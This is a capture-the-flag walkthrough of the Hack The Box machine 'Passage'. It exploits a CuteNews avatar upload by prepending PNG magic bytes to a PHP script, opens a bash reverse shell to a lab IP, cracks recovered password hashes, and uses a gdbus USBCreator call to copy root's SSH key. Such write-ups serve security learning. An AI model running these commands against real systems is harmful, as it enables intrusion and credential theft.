The first post references the implementation of fail2ban:

Meaning if we send too many requests in the same time, we will be banned for two minutes meaning we won’t be able to bruteforce anything. I don’t see much on the website aside from at the bottom, there is:

So I start googling about the framework, I can only find exploits with specific versions but I’m not sure what version this is and don’t want to be banned through fail2ban so I won’t try them until I find a version. I look at the source and see some emails:

Paul and Nadav have their domain as passage.htb so I add that to /etc/hosts and see if a different page shows but it does not. These names may be useful later on. I google for where possible login page could be and find it at http://10.10.10.206/CuteNews/index.php:

Now I have a version number:

So now I start looking for CVE exploits that are for CuteNews 2.1.2 or later. I find an exploit on exploitdb which looks to exploit the service using an image upload of an avatar with php code within and the header of an image at the start to smuggle the code in. I register an account and can view the settings of my user:

Where I can see where the image will be uploaded. I test by uploading an image and can see that it uploads successfully:

I try to upload a php script but this returns:

I also try changing the extension from .php to .png but this does not work. My first guess was to take the magic bytes of a picture and prepend it to the front of my php script. So, I take my script:

And open it in a hex editor:

Then, I take the magic bytes of a png as listed on the wikipedia page: 89 50 4E 47 0D 0A 1A 0A and prepend them onto my script (making sure to select the data as hexadecimal values and not text):

I then export the new file as picture.php and upload to the web interface. And it’s successful!

When right clicking the picture in the browser, we can select View Image:

Which takes us to the location where the image uploaded to:

Currently, it only shows:

Initially, for my reverse shell, I tried the command bash -i >& /dev/tcp/10.10.14.205/9919 0>&1 which didn’t work but I remembered that I must encode since there could be some characters that break the http request. You can do this in burpsuite by selecting the statement and pressing ctrl + u:

When I run this, I still get no return so I slightly modify my reverse shell command to be bash -c 'bash -i >& /dev/tcp/10.10.14.205/9919 0>&1' and re-run:

And I get a response!

The first thing I do is upgrade the session to a fully interactive tty by running


python -c "import pty;pty.spawn('/bin/bash')"

ctrl + z

fg

enter

enter

This means I now have tab autocomplete and can do things like ctrl +c without having to get another shell. To upgrade it further, I first run stty -a on my machine and noting the amount of rows and columns:

I can do:


export TERM=xterm-256color

export SHELL=bash

stty rows 47 columns 198

Which gives me the ability to do things like clearing the screen using ctrl + l or viewing colour in the terminal and removes any formatting errors that may occur.

This does not yet give me user.txt so I need to find a way to get to a different user. I try to see if I can access anything through /home but my access is denied. I can however see two users: nadav and paul which were the two users I identified earlier from the emails in the html source.

I look around the box but don’t find much. I’m currently in the directory of the CuteNews project so I look at the github repo for it and search how users are logged in to see if I can get any credentials to escalate privileges. I find that there is no database used to store things, just files. Looking further into the files, I find a file called lines in the cdata/users directory

This seems to have this one php line in between lines of what appears to be base64. I copy the output and paste into cyberchef. I remove the php lines with a quick Find/Replace and then remove blank lines leaving just the base64. Using fork to treat each line individually, I convert from base64 to see:

This looks like serialised data and since there was php code in the same file, I guess that the php deserialize instruction might work. So I place in the recipe and it works, the output is now much more readable:

The passwords are evidently hashed so I copy the hashes for Nadav and Paul (since they are the only users on the box) and paste into crackstation and I get a match! The password found is for Paul:

I su paul and enter the password:

I run linpeas but don’t find anything useful. Looking around, I find that id_rsa.pub for Paul, contains Nadav’s name:

This means that Paul’s key is the same as Nadav’s

So I copy Paul’s id_rsa and use it to ssh as Nadav:

After looking around the box for a while, I find .viminfo in the home directory contains some useful information:

And dbus is also in the suid binaries:

I search for exploits regarding USBCreator and find this article detailing how I can use it to move/copy files from one location to another. I choose to copy the ssh key of root into a directory I can read. Using the command that was executed in the article and modifying a little, my command becomes:


gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /home/nadav/test.txt true

Which results in the following:

Now I can copy this output and use to access root from ssh
